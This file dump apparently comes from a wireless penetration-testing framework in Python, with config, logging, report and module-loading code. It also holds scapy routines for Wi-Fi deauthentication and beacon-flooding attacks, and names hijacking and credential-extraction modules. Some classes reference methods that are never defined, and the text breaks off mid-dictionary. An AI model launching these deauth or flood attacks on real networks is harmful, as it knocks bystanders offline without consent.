# main.py
# main.py

#!/usr/bin/env python3

import sys
import logging
from ui.cli import cli  # Ensure the import path is correct

def setup_logging():
    """
    Configures the root logger to ensure that logs are captured correctly.
    """
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)  # Set to DEBUG to capture all levels; adjust as needed

    # Create console handler with a higher log level
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)  # Set to INFO to reduce verbosity; adjust as needed

    # Create formatter and add it to the handlers
    formatter = logging.Formatter('[%(asctime)s] %(levelname)s - %(name)s - %(message)s')
    ch.setFormatter(formatter)

    # Add the handlers to the logger
    if not logger.handlers:
        logger.addHandler(ch)

def main():
    """
    The main entry point of the application.
    """
    setup_logging()

    try:
        # Pass command-line arguments to Click's CLI
        cli.main(args=sys.argv[1:], obj={})
    except Exception as e:
        logging.error(f"An error occurred while running the CLI: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()


# setup.py
# setup.py

from setuptools import setup, find_packages

setup(
    name='wireless_pen_test_lib',
    version='1.0.0',
    packages=find_packages(),
    install_requires=[
        'click',
        'PyYAML',
        'docker',
        'scapy',
        # Add other dependencies as needed
    ],
    entry_points={
        'console_scripts': [
            'wireless-pen-test=ui.cli:cli',
        ],
    },
)


# core/config_manager.py
import os
import yaml
import logging
from pydantic import BaseModel, Field, ValidationError

# Define configuration models
class GeneralConfig(BaseModel):
    interface: str
    report_directory: str
    log_level: str = 'INFO'  # Added missing field with default value

class EncryptionScannerConfig(BaseModel):
    scan_duration: int

class AuthBypassScannerConfig(BaseModel):
    scan_duration: int

class DosScannerConfig(BaseModel):
    scan_duration: int

class LocalScannerConfig(BaseModel):
    scan_duration: int
    interface: str
    vendor_lookup: bool

class ScannersConfig(BaseModel):
    encryption_scanner: EncryptionScannerConfig
    auth_bypass_scanner: AuthBypassScannerConfig
    dos_scanner: DosScannerConfig
    local_scanner: LocalScannerConfig

class SessionHijackingConfig(BaseModel):
    max_packets: int

class CredentialExtractionConfig(BaseModel):
    pass  # No required fields

class PayloadDeliveryConfig(BaseModel):
    payload_types: list
    default_duration: int

class ExploitsConfig(BaseModel):
    session_hijacking: SessionHijackingConfig
    credential_extraction: CredentialExtractionConfig
    payload_delivery: PayloadDeliveryConfig

class UIConfig(BaseModel):
    theme: str = 'light'  # Default theme

class ConfigModel(BaseModel):
    general: GeneralConfig = Field(default_factory=GeneralConfig)
    scanners: ScannersConfig
    exploits: ExploitsConfig
    ui: UIConfig = Field(default_factory=UIConfig)

class ConfigManager:
    def __init__(self, config_dir: str = None):
        self.project_root = os.path.abspath(os.path.dirname(__file__))
        self.config_dir = config_dir or os.path.join(self.project_root, 'config')
        self.default_config_path = os.path.join(self.config_dir, 'default_config.yaml')
        self.user_config_path = os.path.join(self.config_dir, 'config.yaml')
        self.config = None
        self.logger = logging.getLogger(__name__)
        self.load_config()

    def create_default_config(self):
        # Create default config if it doesn't exist
        if not os.path.exists(self.default_config_path):
            default_config = {
                'general': {
                    'interface': 'wlan0mon',
                    'report_directory': 'reports',
                    'log_level': 'INFO',
                },
                'scanners': {
                    'encryption_scanner': {'scan_duration': 10},
                    'auth_bypass_scanner': {'scan_duration': 15},
                    'dos_scanner': {'scan_duration': 5},
                    'local_scanner': {
                        'scan_duration': 8,
                        'interface': 'wlan0mon',
                        'vendor_lookup': True
                    },
                },
                'exploits': {
                    'session_hijacking': {'max_packets': 100},
                    'credential_extraction': {},
                    'payload_delivery': {
                        'payload_types': ['type1', 'type2'],
                        'default_duration': 30
                    },
                },
                'ui': {
                    'theme': 'dark'
                }
            }
            os.makedirs(self.config_dir, exist_ok=True)
            with open(self.default_config_path, 'w') as f:
                yaml.dump(default_config, f)

    def load_config(self):
        try:
            self.create_default_config()
            with open(self.default_config_path, 'r') as f:
                default_config = yaml.safe_load(f)
            self.logger.debug("Loaded default configuration.")

            if os.path.exists(self.user_config_path):
                with open(self.user_config_path, 'r') as f:
                    user_config = yaml.safe_load(f)
                self.logger.debug("Loaded user configuration.")
            else:
                user_config = {}
                self.logger.info("User configuration file not found. Using defaults.")

            # Merge configurations: user_config overrides default_config
            merged_config = self.merge_configs(default_config, user_config)

            self.config = ConfigModel(**merged_config)
        except (yaml.YAMLError, ValidationError) as e:
            self.logger.error(f"Error loading configuration: {e}")
            raise e

    def merge_configs(self, default, override):
        merged = default.copy()
        for key, value in override.items():
            if key in merged and isinstance(merged[key], dict):
                merged[key] = self.merge_configs(merged[key], value)
            else:
                merged[key] = value
        return merged

    def get_config(self):
        return self.config

# core/event_dispatcher.py
import logging
from collections import defaultdict

class EventDispatcher:
    def __init__(self):
        self.listeners = defaultdict(list)
        self.logger = logging.getLogger(self.__class__.__name__)

    def subscribe(self, event_type, callback):
        """
        Subscribes a callback function to a specific event type.
        :param event_type: The type/name of the event.
        :param callback: The function to call when the event is dispatched.
        """
        self.listeners[event_type].append(callback)
        self.logger.info(f"Subscribed to event '{event_type}': {callback.__name__}")

    def unsubscribe(self, event_type, callback):
        """
        Unsubscribes a callback function from a specific event type.
        :param event_type: The type/name of the event.
        :param callback: The function to remove from the event's listener list.
        """
        if callback in self.listeners[event_type]:
            self.listeners[event_type].remove(callback)
            self.logger.info(f"Unsubscribed from event '{event_type}': {callback.__name__}")

    def dispatch(self, event_type, *args, **kwargs):
        """
        Dispatches an event to all subscribed listeners.
        :param event_type: The type/name of the event.
        :param args: Positional arguments for the callback.
        :param kwargs: Keyword arguments for the callback.
        """
        self.logger.info(f"Dispatching event '{event_type}' to {len(self.listeners[event_type])} listeners.")
        for callback in self.listeners[event_type]:
            try:
                callback(*args, **kwargs)
            except Exception as e:
                self.logger.error(f"Error in callback '{callback.__name__}' for event '{event_type}': {e}")


# core/log_manager.py
import logging
import os
from logging.handlers import RotatingFileHandler
from core.config_manager import ConfigManager


class LogManager:
    def __init__(self, config: ConfigManager):
        self.config = config.get_config()
        self.logger = logging.getLogger()
        self.configure_logging()

    def configure_logging(self):
        # Clear existing handlers
        if self.logger.hasHandlers():
            self.logger.handlers.clear()

        # Set log level
        log_level_str = self.config.general.log_level.upper()
        log_level = getattr(logging, log_level_str, logging.INFO)
        self.logger.setLevel(log_level)

        # Create log formatter
        formatter = logging.Formatter('[%(asctime)s] %(levelname)s - %(name)s - %(message)s')

        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)

        # File handler with rotation
        log_file = os.path.join(self.config.general.report_directory, '..', 'logs', 'app.log')
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        file_handler = RotatingFileHandler(log_file, maxBytes=5 * 1024 * 1024, backupCount=5)
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)

        self.logger.debug("Logging has been configured.")


# core/module_manager.py
import importlib
import os
import sys
import logging


class ModuleManager:
    def __init__(self, modules_path, event_dispatcher, core_framework):
        self.modules_path = modules_path
        self.modules = {}
        self.logger = logging.getLogger(self.__class__.__name__)
        self.event_dispatcher = event_dispatcher
        self.core_framework = core_framework
        self.load_modules()

    def load_modules(self):
        self.logger.info(f"Loading modules from {self.modules_path}")
        sys.path.insert(0, self.modules_path)

        for filename in os.listdir(self.modules_path):
            if filename.endswith(".py") and not filename.startswith("__"):
                module_name = filename[:-3]
                try:
                    module = importlib.import_module(module_name)
                    for attribute_name in dir(module):
                        attribute = getattr(module, attribute_name)
                        if isinstance(attribute, type):
                            from core.config.protocols.base_protocol import BaseProtocol
                            if issubclass(attribute, BaseProtocol) and attribute != BaseProtocol:
                                instance = attribute(interface='wlan0mon', core=self.core_framework)
                                instance.register(self.event_dispatcher)
                                self.modules[module_name] = instance
                                self.logger.info(f"Loaded and registered protocol module: {module_name}")
                except Exception as e:
                    self.logger.error(f"Failed to load module {module_name}: {e}")

        sys.path.pop(0)

    def get_module(self, module_name):
        return self.modules.get(module_name, None)

    def list_modules(self):
        return list(self.modules.keys())


# core/report_generator.py
import os
import json
import logging
from jinja2 import Environment, FileSystemLoader
import pdfkit
from core.config_manager import ConfigManager


class ReportGenerator:
    def __init__(self, config, scanners, exploits):
        self.config = config
        self.scanners = scanners
        self.exploits = exploits
        self.logger = logging.getLogger(self.__class__.__name__)
        self.env = Environment(loader=FileSystemLoader(searchpath=os.path.join(os.getcwd(), 'templates')))
        self.template = self.env.get_template('report_template.html')
        self.ensure_report_directories()

    def ensure_report_directories(self):
        os.makedirs(os.path.join(self.config.general.report_directory, 'html'), exist_ok=True)
        os.makedirs(os.path.join(self.config.general.report_directory, 'pdf'), exist_ok=True)
        os.makedirs(os.path.join(self.config.general.report_directory, 'json'), exist_ok=True)
        self.logger.debug("Report directories are ensured.")

    def generate_reports(self):
        # Gather data from scanners and exploits
        report_data = {
            'scanners': {},
            'exploits': {}
        }

        for sc_name, scanner in self.scanners.items():
            report_data['scanners'][sc_name] = {
                'results': scanner.detected_vulnerabilities
            }

        for ex_name, exploit in self.exploits.items():
            report_data['exploits'][ex_name] = {
                'results': exploit.detected_vulnerabilities
            }

        # Generate JSON report
        json_report_path = os.path.join(self.config.general.report_directory, 'json', 'report.json')
        with open(json_report_path, 'w') as f:
            json.dump(report_data, f, indent=4)
        self.logger.info(f"JSON report generated at {json_report_path}")

        # Generate HTML report using Jinja2 template
        html_content = self.template.render(report=report_data)
        html_report_path = os.path.join(self.config.general.report_directory, 'html', 'report.html')
        with open(html_report_path, 'w') as f:
            f.write(html_content)
        self.logger.info(f"HTML report generated at {html_report_path}")

        # Convert HTML to PDF
        pdf_report_path = os.path.join(self.config.general.report_directory, 'pdf', 'report.pdf')
        try:
            pdfkit.from_file(html_report_path, pdf_report_path)
            self.logger.info(f"PDF report generated at {pdf_report_path}")
        except Exception as e:
            self.logger.error(f"Failed to generate PDF report: {e}")

    def create_html_template(self):
        # Create a simple HTML template if it doesn't exist
        templates_dir = os.path.join(os.getcwd(), 'templates')
        os.makedirs(templates_dir, exist_ok=True)
        template_path = os.path.join(templates_dir, 'report_template.html')
        if not os.path.exists(template_path):
            with open(template_path, 'w') as f:
                f.write("""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WirelessPenTestLib Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1, h2, h3 { color: #333; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 40px; }
        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .summary { background-color: #e6f7ff; padding: 10px; border: 1px solid #91d5ff; }
    </style>
</head>
<body>
    <h1>WirelessPenTestLib Report</h1>

    <div class="summary">
        <h2>Summary</h2>
        <p>Total Scanners Run: {{ report.scanners | length }}</p>
        <p>Total Exploits Run: {{ report.exploits | length }}</p>
    </div>

    <h2>Scanners Results</h2>
    {% for sc_name, sc_data in report.scanners.items() %}
        <h3>{{ sc_name.replace('_', ' ').title() }}</h3>
        {% if sc_data.results %}
            <table>
                <thead>
                    <tr>
                        <th>SSID</th>
                        <th>BSSID</th>
                        <th>Protocol</th>
                        <th>Description</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    {% for vuln in sc_data.results %}
                        <tr>
                            <td>{{ vuln.ssid }}</td>
                            <td>{{ vuln.bssid }}</td>
                            <td>{{ vuln.protocol }}</td>
                            <td>{{ vuln.description }}</td>
                            <td>{{ vuln.action }}</td>
                        </tr>
                    {% endfor %}
                </tbody>
            </table>
        {% else %}
            <p>No vulnerabilities detected.</p>
        {% endif %}
    {% endfor %}

    <h2>Exploits Results</h2>
    {% for ex_name, ex_data in report.exploits.items() %}
        <h3>{{ ex_name.replace('_', ' ').title() }}</h3>
        {% if ex_data.results %}
            <table>
                <thead>
                    <tr>
                        <th>Target</th>
                        <th>Description</th>
                        <th>Status</th>
                        <th>Action Taken</th>
                    </tr>
                </thead>
                <tbody>
                    {% for vuln in ex_data.results %}
                        <tr>
                            <td>{{ vuln.target }}</td>
                            <td>{{ vuln.description }}</td>
                            <td>{{ vuln.status }}</td>
                            <td>{{ vuln.action_taken }}</td>
                        </tr>
                    {% endfor %}
                </tbody>
            </table>
        {% else %}
            <p>No exploitation activities performed.</p>
        {% endif %}
    {% endfor %}

    <footer>
        <p>Report generated on {{ time }}</p>
    </footer>
</body>
</html>""")
            self.logger.info(f"HTML template created at {template_path}")


# core/task_scheduler.py
import threading
import logging

class TaskScheduler:
    def __init__(self):
        self.tasks = []
        self.logger = logging.getLogger(self.__class__.__name__)

    def add_task(self, task, *args, **kwargs):
        """
        Adds a task to the scheduler.
        :param task: The function to execute.
        :param args: Arguments for the task.
        :param kwargs: Keyword arguments for the task.
        """
        self.tasks.append((task, args, kwargs))
        self.logger.info(f"Task added: {task.__name__}")

    def run_sequential(self):
        """
        Runs all tasks sequentially.
        """
        self.logger.info("Starting sequential task execution.")
        for task, args, kwargs in self.tasks:
            try:
                self.logger.info(f"Executing task: {task.__name__}")
                task(*args, **kwargs)
            except Exception as e:
                self.logger.error(f"Error executing task {task.__name__}: {e}")
        self.logger.info("Sequential task execution completed.")

    def run_concurrent(self, max_threads=5):
        """
        Runs tasks concurrently using threading.
        :param max_threads: Maximum number of concurrent threads.
        """
        self.logger.info("Starting concurrent task execution.")
        threads = []
        for task, args, kwargs in self.tasks:
            while threading.active_count() > max_threads:
                pass  # Wait until there's a free thread
            thread = threading.Thread(target=self._execute_task, args=(task, args, kwargs))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()
        self.logger.info("Concurrent task execution completed.")

    def _execute_task(self, task, args, kwargs):
        """
        Helper method to execute a single task.
        """
        try:
            self.logger.info(f"Executing task: {task.__name__}")
            task(*args, **kwargs)
        except Exception as e:
            self.logger.error(f"Error executing task {task.__name__}: {e}")


# core/__init__.py
# core/__init__.py

import os
import logging
import time
import json
import importlib.util
from scapy.all import sendp
from test_network.manage import start_network, stop_network, status_network
from core.config_manager import ConfigManager
from project_specifc_utils.network_interface_manager import NetworkInterfaceManager
from project_specifc_utils.data_storage_manager import DataStorageManager
from project_specifc_utils.authentication_tools import AuthenticationTools

# Initialize Logging for CoreFramework
def setup_core_logging(project_root: str) -> logging.Logger:
    logs_dir = os.path.join(project_root, 'logs')
    os.makedirs(logs_dir, exist_ok=True)

    log_file = os.path.join(logs_dir, 'core_framework.log')

    logger = logging.getLogger('CoreFramework')
    logger.setLevel(logging.DEBUG)

    formatter = logging.Formatter('[%(asctime)s] %(levelname)s - %(name)s - %(message)s')

    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)

    stream_handler = logging.StreamHandler()
    stream_handler.setLevel(logging.INFO)
    stream_handler.setFormatter(formatter)

    if not logger.handlers:
        logger.addHandler(file_handler)
        logger.addHandler(stream_handler)

    return logger

class CoreFramework:
    def __init__(self, modules_path: str, config_dir: str = "config",
                 vulnerabilities_path: str = None,
                 sendp_func=sendp, sleep_func=time.sleep,
                 network_manager=None, data_storage_manager=None, auth_tools=None,
                 scanners=None, exploits=None, test_network: bool=False):
        """
        Initialize the CoreFramework with necessary configurations.
        """
        self.test_network = test_network
        self.modules_path = modules_path
        self.project_root = os.path.abspath(os.path.join(modules_path, os.pardir, os.pardir))
        self.logger = setup_core_logging(self.project_root)
        self.logger.info("Initializing CoreFramework...")

        # Initialize ConfigManager
        try:
            self.config_manager = ConfigManager(config_dir=config_dir)
            self.config = self.config_manager.get_config()
            self.logger.info("Configuration loaded successfully.")
        except Exception as e:
            self.logger.error(f"Error loading configuration: {e}", exc_info=True)
            raise

        # Validate general configuration keys
        required_general_keys = ['interface', 'report_directory']
        missing_keys = [key for key in required_general_keys if not hasattr(self.config.general, key)]
        if missing_keys:
            self.logger.error(f"Missing keys in general configuration: {missing_keys}")
            raise AttributeError(f"Missing keys in general configuration: {missing_keys}")

        # Set vulnerabilities path
        if vulnerabilities_path:
            path_to_vulnerabilities = vulnerabilities_path
        else:
            path_to_vulnerabilities = os.path.join(self.project_root, 'vulnerabilities', 'vulnerabilities.json')

        # Ensure vulnerabilities directory exists
        vulnerabilities_dir = os.path.dirname(path_to_vulnerabilities)
        os.makedirs(vulnerabilities_dir, exist_ok=True)

        # Load vulnerability database
        try:
            if not os.path.isfile(path_to_vulnerabilities):
                self.logger.warning(f"Vulnerability database not found at {path_to_vulnerabilities}. Creating a new one.")
                with open(path_to_vulnerabilities, 'w') as f:
                    json.dump({}, f, indent=4)
                self.vulnerability_db = {}
            else:
                with open(path_to_vulnerabilities, 'r') as f:
                    self.vulnerability_db = json.load(f)
                if not isinstance(self.vulnerability_db, dict):
                    self.logger.error(f"Vulnerability database must be a dictionary. Found type: {type(self.vulnerability_db)}")
                    raise TypeError("Vulnerability database must be a dictionary.")
                self.logger.info(f"Loaded vulnerability database from {path_to_vulnerabilities}.")
        except (FileNotFoundError, json.JSONDecodeError, TypeError) as e:
            self.logger.warning(f"Error loading vulnerability database: {e}. Initializing empty vulnerability database.", exc_info=True)
            self.vulnerability_db = {}

        # Initialize Network and Data Storage Managers
        try:
            self.network_manager = network_manager if network_manager else NetworkInterfaceManager(interface=self.config.general.interface)
            self.data_storage_manager = data_storage_manager if data_storage_manager else DataStorageManager(report_directory=self.config.general.report_directory)
            self.auth_tools = auth_tools if auth_tools else AuthenticationTools()
            self.logger.info("Network and Data Storage Managers initialized successfully.")
        except Exception as e:
            self.logger.error(f"Error initializing components: {e}", exc_info=True)
            raise

        # Initialize Scanners and Exploits
        self.scanners = scanners if scanners else {}
        self.exploits = exploits if exploits else {}

        # Assign sendp and sleep functions
        self.sendp = sendp_func
        self.sleep = sleep_func

        # Load Protocol Modules
        try:
            self.load_protocol_modules()
        except Exception as e:
            self.logger.error(f"Failed to load protocol modules: {e}", exc_info=True)
            raise

        self.logger.info("CoreFramework initialized successfully.")

    def run_local_scan(self, interface: str):
        self.logger.info(f"Running local scan on interface: {interface}")
        try:
            self.network_manager.set_monitor_mode()
            self.network_manager.start_scanning()
            self.sleep(30)
            self.network_manager.stop_scanning()
            self.network_manager.set_managed_mode()
            self.logger.info("Local scan completed successfully.")
        except Exception as e:
            self.logger.error(f"Error running local scan: {e}", exc_info=True)
            raise

    def load_protocol_modules(self):
        protocols_dir = self.modules_path
        self.logger.info(f"Loading protocol modules from {protocols_dir}...")

        if not os.path.isdir(protocols_dir):
            self.logger.error(f"Protocols directory not found at {protocols_dir}.")
            raise FileNotFoundError(f"Protocols directory not found at {protocols_dir}.")

        for filename in os.listdir(protocols_dir):
            if filename.endswith('.py') and filename != '__init__.py':
                module_name = filename[:-3]
                file_path = os.path.join(protocols_dir, filename)
                self.logger.debug(f"Loading module '{module_name}' from '{file_path}'.")
                try:
                    spec = importlib.util.spec_from_file_location(module_name, file_path)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)

                    if hasattr(module, 'register_scanner'):
                        scanner = module.register_scanner()
                        if scanner.name in self.scanners:
                            self.logger.warning(f"Scanner '{scanner.name}' is already registered. Skipping.")
                        else:
                            self.scanners[scanner.name] = scanner
                            self.logger.info(f"Registered scanner: {scanner.name}")

                    if hasattr(module, 'register_exploit'):
                        exploit = module.register_exploit()
                        if exploit.name in self.exploits:
                            self.logger.warning(f"Exploit '{exploit.name}' is already registered. Skipping.")
                        else:
                            self.exploits[exploit.name] = exploit
                            self.logger.info(f"Registered exploit: {exploit.name}")

                except Exception as e:
                    self.logger.error(f"Failed to load module '{module_name}': {e}", exc_info=True)

        self.logger.info("Protocol modules loaded successfully.")

    def run_scanner(self, scanner_name: str, target_info: dict):
        scanner = self.scanners.get(scanner_name)
        if not scanner:
            self.logger.error(f"Scanner '{scanner_name}' not found.")
            raise ValueError(f"Scanner '{scanner_name}' not found.")
        self.logger.info(f"Running scanner: {scanner_name} on target: {target_info}")
        try:
            vulnerabilities = scanner.scan(target_info)
            self.logger.debug(f"Vulnerabilities found by {scanner_name}: {vulnerabilities}")
            for key, value in vulnerabilities.items():
                if key not in self.vulnerability_db:
                    self.vulnerability_db[key] = []
                self.vulnerability_db[key].extend(value)
            self.logger.info(f"Scanner '{scanner_name}' completed successfully.")
        except Exception as e:
            self.logger.error(f"Error running scanner '{scanner_name}': {e}", exc_info=True)
            raise

    def run_exploit(self, exploit_name: str, vuln_info: dict):
        exploit = self.exploits.get(exploit_name)
        if not exploit:
            self.logger.error(f"Exploit '{exploit_name}' not found.")
            raise ValueError(f"Exploit '{exploit_name}' not found.")
        self.logger.info(f"Running exploit: {exploit_name} with vulnerability info: {vuln_info}")
        try:
            vulnerabilities = exploit.execute(vuln_info)
            self.logger.debug(f"Vulnerabilities affected by {exploit_name}: {vulnerabilities}")
            for key, value in vulnerabilities.items():
                if key not in self.vulnerability_db:
                    self.vulnerability_db[key] = []
                self.vulnerability_db[key].extend(value)
            self.logger.info(f"Exploit '{exploit_name}' completed successfully.")
        except Exception as e:
            self.logger.error(f"Error running exploit '{exploit_name}': {e}", exc_info=True)
            raise

    def start_test_network(self, compose_file: str):
        if self.test_network:
            self.logger.info("Starting test network...")
            start_network(compose_file)

    def stop_test_network(self, compose_file: str):
        if self.test_network is False:
            self.logger.warning("Test network is not enabled. Skipping stop operation.")
            return
        stop_network(compose_file)

    def send_continuous_packets(self, packet, interval: float):
        self.logger.info(f"Starting to send packets every {interval} seconds.")
        self.continuous_sending = True
        while self.continuous_sending:
            try:
                self.sendp(packet, iface=self.network_manager.interface, verbose=False)
                self.sleep(interval)
            except Exception as e:
                self.logger.error(f"Error sending packet: {e}", exc_info=True)
                self.continuous_sending = False

    def stop_continuous_packets(self):
        self.logger.info("Stopping continuous packet sending.")
        self.continuous_sending = False

    def finalize(self):
        self.logger.info("Finalizing testing activities...")
        try:
            self.data_storage_manager.generate_report(self.vulnerability_db)
            self.logger.info("Finalization and report generation completed successfully.")
        except Exception as e:
            self.logger.error(f"Error during finalization: {e}", exc_info=True)
            raise


# core/config/__init__.py



# core/config/protocols/base_protocol.py
from abc import ABC, abstractmethod

class BaseProtocol(ABC):
    @abstractmethod
    def register(self, event_dispatcher):
        """
        Registers event listeners with the Event Dispatcher.
        """
        pass

    @abstractmethod
    def start(self):
        """
        Starts the protocol-specific operations (e.g., sniffing, injection).
        """
        pass

    @abstractmethod
    def stop(self):
        """
        Stops the protocol-specific operations.
        """
        pass


# core/config/protocols/bluetooth.py
from scapy.all import *
from scapy.layers.bluetooth import *
import threading
import logging
from core.config.protocols.base_protocol import BaseProtocol



class BluetoothProtocol(BaseProtocol):
    def __init__(self, interface='hci0'):
        self.interface = interface
        self.scanning = False
        self.logger = logging.getLogger(self.__class__.__name__)
        self.scan_results = {}
        self.scan_thread = None

    def register(self, event_dispatcher):
        """
        Registers event listeners relevant to Wi-Fi operations.
        """
        # Existing subscriptions
        event_dispatcher.subscribe('start_scan', self.start_scan)
        event_dispatcher.subscribe('stop_scan', self.stop_scan)
        event_dispatcher.subscribe('start_deauth', self.start_deauth)
        event_dispatcher.subscribe('stop_deauth', self.stop_deauth)
        # New subscriptions
        event_dispatcher.subscribe('start_beacon_flood', self.start_beacon_flood)
        event_dispatcher.subscribe('stop_beacon_flood', self.stop_beacon_flood)
        self.logger.info("WiFiProtocol registered to Event Dispatcher.")


    def start(self):
        """
        Starts Bluetooth operations.
        """
        self.logger.info("Starting Bluetooth Protocol operations.")
        self.scanning = True
        self.scan_thread = threading.Thread(target=self.scan_devices)
        self.scan_thread.start()

    def stop(self):
        """
        Stops Bluetooth operations.
        """
        self.logger.info("Stopping Bluetooth Protocol operations.")
        self.scanning = False
        if self.scan_thread and self.scan_thread.is_alive():
            self.scan_thread.join()

    def scan_devices(self):
        """
        Scans for Bluetooth devices.
        """
        self.logger.info(f"Starting Bluetooth device scan on interface {self.interface}.")
        # Implement Bluetooth scanning logic using Scapy or other libraries
        # Placeholder: Simulate device discovery
        while self.scanning:
            # Simulate discovery
            device = f'Device_{len(self.scan_results) + 1}'
            mac = f'AA:BB:CC:DD:EE:{len(self.scan_results) + 1:02X}'
            self.scan_results[mac] = device
            self.logger.info(f"Discovered Bluetooth Device: Name='{device}', MAC='{mac}'")
            time.sleep(5)  # Simulate time between discoveries

    def start_scan(self):
        """
        Initiates a Bluetooth scan.
        """
        self.logger.info("Starting Bluetooth scan.")
        self.scan_results = {}
        self.scanning = True
        if not self.scan_thread or not self.scan_thread.is_alive():
            self.scan_thread = threading.Thread(target=self.scan_devices)
            self.scan_thread.start()

    def stop_scan(self):
        """
        Stops the Bluetooth scan and processes results.
        """
        self.logger.info("Stopping Bluetooth scan.")
        self.scanning = False
        if self.scan_thread and self.scan_thread.is_alive():
            self.scan_thread.join()
        self.logger.info(f"Bluetooth Scan Results: {self.scan_results}")
        # Dispatch scan complete event if needed


# core/config/protocols/wifi.py
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth
import threading
import logging
from core.config.protocols.base_protocol import BaseProtocol


class WiFiProtocol(BaseProtocol):
    def __init__(self, interface='wlan0mon', core=None):
        """
        Initializes the WiFiProtocol.

        :param interface: Wireless interface in monitor mode.
        :param core: Reference to the CoreFramework instance.
        """
        self.interface = interface
        self.logger = logging.getLogger(self.__class__.__name__)
        self.scan_results = {}
        self.core = core  # Reference to CoreFramework for packet handling

    def register(self, event_dispatcher):
        """
        Registers event listeners relevant to Wi-Fi operations.
        """
        # Subscribe to events
        event_dispatcher.subscribe('start_scan', self.start_scan)
        event_dispatcher.subscribe('stop_scan', self.stop_scan)
        event_dispatcher.subscribe('start_deauth', self.start_deauth)
        event_dispatcher.subscribe('stop_deauth', self.stop_deauth)
        event_dispatcher.subscribe('start_beacon_flood', self.start_beacon_flood)
        event_dispatcher.subscribe('stop_beacon_flood', self.stop_beacon_flood)
        self.logger.info("WiFiProtocol registered to Event Dispatcher.")

    def start(self):
        """
        Starts any necessary Wi-Fi operations.
        """
        self.logger.info("Starting Wi-Fi Protocol operations.")
        # For example, initiate packet sniffing via CoreFramework
        self.core.start_packet_sniffing()

    def stop(self):
        """
        Stops any ongoing Wi-Fi operations.
        """
        self.logger.info("Stopping Wi-Fi Protocol operations.")
        self.core.stop_packet_sniffing()

    def start_scan(self):
        """
        Initiates a Wi-Fi scan.
        """
        self.logger.info("Starting Wi-Fi scan.")
        self.scan_results = {}
        # The packet sniffer is already running; scan results are collected by the Packet Analyzer

    def stop_scan(self):
        """
        Stops the Wi-Fi scan and processes results.
        """
        self.logger.info("Stopping Wi-Fi scan.")
        # Since the sniffer runs continuously, you might implement scan duration or trigger stop externally
        # For simplicity, assume the scan duration is managed by the test script

    def start_deauth(self, target_bssid, target_client=None, count=10):
        """
        Initiates a deauthentication attack.

        :param target_bssid: BSSID of the target access point.
        :param target_client: (Optional) Specific client to deauthenticate.
        :param count: Number of deauth packets to send.
        """
        self.logger.info(f"Starting deauthentication attack on BSSID: {target_bssid}")
        dot11 = Dot11(addr1=target_client if target_client else 'FF:FF:FF:FF:FF:FF',
                    addr2=self.core.packet_handler.packet_injector.packet_injector.get_interface_mac(),
                    addr3=target_bssid)
        pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
        self.core.send_packet(pkt, count=count, inter=0.1)
        self.logger.info("Deauthentication attack completed.")

    def stop_deauth(self):
        """
        Stops the deauthentication attack.
        """
        self.logger.info("Stopping deauthentication attack.")
        self.core.stop_continuous_packets()

    def start_beacon_flood(self, ssid='FakeAP', count=1000):
        """
        Starts a beacon flooding attack.

        :param ssid: SSID of the fake access point.
        :param count: Number of beacon frames to send.
        """
        self.logger.info(f"Starting beacon flooding attack with SSID '{ssid}'.")
        dot11 = Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF',
                    addr2=self.get_interface_mac(),
                    addr3=self.get_interface_mac())
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        rsn = Dot11Elt(ID='RSNinfo', info=(
            '\x01\x00'  # RSN Version 1
            '\x00\x0f\xac\x02'  # Group Cipher Suite: CCMP
            '\x02\x00'  # Pairwise Cipher Suite Count
            '\x00\x0f\xac\x04'  # Pairwise Cipher Suite: CCMP
            '\x00\x0f\xac\x02'  # Pairwise Cipher Suite: TKIP
            '\x01\x00'  # AKM Suite Count
            '\x00\x0f\xac\x02'  # AKM Suite: PSK
            '\x00\x00'  # RSN Capabilities
        ))
        frame = RadioTap()/dot11/beacon/essid/rsn

        self.core.send_continuous_packets(frame, interval=0.1)
        self.logger.info("Beacon flooding attack started.")

    def stop_beacon_flood(self):
        """
        Stops the beacon flooding attack.
        """
        self.logger.info("Stopping beacon flooding attack.")
        self.core.stop_continuous_packets()

    def get_interface_mac(self):
        """
        Retrieves the MAC address of the specified wireless interface.
        """
        try:
            return get_if_hwaddr(self.interface)
        except Exception as e:
            self.logger.error(f"Failed to get MAC address for interface {self.interface}: {e}")
            return '00:00:00:00:00:00'


# core/config/protocols/__init__.py
from core.config.protocols.base_protocol import BaseProtocol
from core.config.protocols.bluetooth import BluetoothProtocol
from core.config.protocols.wifi import WiFiProtocol
from scanners.auth_bypass_scanner import AuthBypassScanner
from scanners.encryption_scanner import EncryptionWeaknessScanner
from scanners.dos_scanner import DosScanner
from scanners.wep_scanner import WEPScanner
from scanners.local_scanner import LocalScanner
from exploits.session_hijacking import SessionHijacking
from exploits.payload_delivery import PayloadDelivery
from exploits.credential_extraction import CredentialExtraction
# core/config/protocols/__init__.py

# Optionally, register multiple scanners/exploits or keep it empty
# Avoid relative imports unless absolutely necessary

def register_scanners():
    return {
        'wifi': WiFiProtocol,
        'bluetooth': BluetoothProtocol,
        'auth_bypass': AuthBypassScanner,
        'encryption_weakness': EncryptionWeaknessScanner,
        'dos': DosScanner,
        'local': LocalScanner,
        'wep_scanner': WEPScanner,
    }
def register_exploits():
    return {
        'session_hijacking': SessionHijacking,
